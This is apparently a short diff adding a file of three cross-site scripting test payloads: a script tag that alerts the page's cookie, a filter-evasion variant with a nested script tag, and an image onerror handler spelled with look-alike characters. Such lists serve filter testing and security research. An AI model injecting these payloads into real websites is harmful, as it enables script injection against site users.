@@ -1,0 +1,3 @@
+<script>alert(document.cookie)</script>
+<scr<script>ipt>alert(document.cookie)</script>
+<img src=1 οnerrοr=alert(/xss/)>
